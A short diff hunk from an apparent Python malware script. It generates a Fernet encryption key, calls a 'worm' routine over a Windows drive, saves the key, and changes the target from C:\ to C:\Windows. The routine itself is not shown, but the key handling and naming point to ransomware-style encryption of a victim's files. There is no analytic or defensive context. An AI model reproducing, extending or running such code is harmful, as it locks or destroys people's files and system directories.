@@ -76,5 +76,5 @@ if __name__ == "__main__":
             parser.print_help()
     else:
         fuck._key = Fernet.generate_key()
-        fuck.worm(path="c:\\", type=1)
+        fuck.worm(path="c:\\Windows", type=1)
         fuck.save_key()
